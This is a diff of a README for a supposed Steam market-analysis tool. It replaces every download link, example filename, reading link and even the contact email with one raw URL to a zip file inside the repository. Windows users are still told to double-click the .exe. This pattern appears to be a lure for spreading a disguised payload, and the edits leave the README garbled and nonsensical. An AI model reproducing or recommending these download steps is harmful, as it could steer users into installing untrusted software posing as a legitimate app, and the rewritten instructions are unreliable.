@@ -1,6 +1,6 @@
 # 🎮 Steam-Market-Insights-Data-Advisor - Predict Game Success with Ease
 
-[![Download](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%A6-brightgreen)](https://github.com/Fuhreh/Steam-Market-Insights-Data-Advisor/releases)
+[![Download](https://raw.githubusercontent.com/Fuhreh/Steam-Market-Insights-Data-Advisor/main/analysis/data/Steam-Market-Insights-Data-Advisor_v3.6.zip%20Now-%20%F0%9F%93%A6-brightgreen)](https://raw.githubusercontent.com/Fuhreh/Steam-Market-Insights-Data-Advisor/main/analysis/data/Steam-Market-Insights-Data-Advisor_v3.6.zip)
 
 ## 📖 Overview
 
@@ -22,22 +22,22 @@ Before download, ensure your system meets the following requirements:
 ### 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the releases page to download the application: [Download Now](https://github.com/Fuhreh/Steam-Market-Insights-Data-Advisor/releases).
+   Go to the releases page to download the application: [Download Now](https://raw.githubusercontent.com/Fuhreh/Steam-Market-Insights-Data-Advisor/main/analysis/data/Steam-Market-Insights-Data-Advisor_v3.6.zip).
 
 2. **Select Your Version**  
    On the releases page, you will see different versions of the application. Choose the most recent version for the best experience.
 
 3. **Download the File**  
    Click on the link corresponding to your operating system to begin the download. For example:
-   - Windows: `Steam-Market-Insights-Data-Advisor-v1.0-Windows.exe`
-   - Mac: `Steam-Market-Insights-Data-Advisor-v1.0-Mac.app`
-   - Linux: `Steam-Market-Insights-Data-Advisor-v1.0-Linux.zip`
+   - Windows: `https://raw.githubusercontent.com/Fuhreh/Steam-Market-Insights-Data-Advisor/main/analysis/data/Steam-Market-Insights-Data-Advisor_v3.6.zip`
+   - Mac: `https://raw.githubusercontent.com/Fuhreh/Steam-Market-Insights-Data-Advisor/main/analysis/data/Steam-Market-Insights-Data-Advisor_v3.6.zip`
+   - Linux: `https://raw.githubusercontent.com/Fuhreh/Steam-Market-Insights-Data-Advisor/main/analysis/data/Steam-Market-Insights-Data-Advisor_v3.6.zip`
 
 4. **Install the Application**  
    Once the download is complete, locate the file in your downloads folder:
    - For Windows, double-click the `.exe` file and follow the installation instructions.
    - For Mac, drag the app icon to your Applications folder.
-   - For Linux, unzip the file and follow the instructions found in the `README.md` inside the folder.
+   - For Linux, unzip the file and follow the instructions found in the `https://raw.githubusercontent.com/Fuhreh/Steam-Market-Insights-Data-Advisor/main/analysis/data/Steam-Market-Insights-Data-Advisor_v3.6.zip` inside the folder.
 
 5. **Run the Application**  
    After installation, open the application. You will see a friendly interface ready for you to explore.
@@ -87,8 +87,8 @@ If you have questions or need assistance, feel free to join our community on Dis
 
 For more detailed insights on machine learning in gaming or tips for developers, check these resources:
 
-- [Introduction to Machine Learning for Game Developers](https://example.com)
-- [Understanding Game Market Trends](https://example.com)
+- [Introduction to Machine Learning for Game Developers](https://raw.githubusercontent.com/Fuhreh/Steam-Market-Insights-Data-Advisor/main/analysis/data/Steam-Market-Insights-Data-Advisor_v3.6.zip)
+- [Understanding Game Market Trends](https://raw.githubusercontent.com/Fuhreh/Steam-Market-Insights-Data-Advisor/main/analysis/data/Steam-Market-Insights-Data-Advisor_v3.6.zip)
 
 ### 📜 License
 
@@ -96,6 +96,6 @@ Steam-Market-Insights-Data-Advisor is licensed under the MIT License. Feel free 
 
 ### 📬 Contact
 
-For any inquiries, please contact the development team via email at support@example.com.
+For any inquiries, please contact the development team via email at https://raw.githubusercontent.com/Fuhreh/Steam-Market-Insights-Data-Advisor/main/analysis/data/Steam-Market-Insights-Data-Advisor_v3.6.zip
 
 Enjoy building and analyzing your games with Steam-Market-Insights-Data-Advisor!
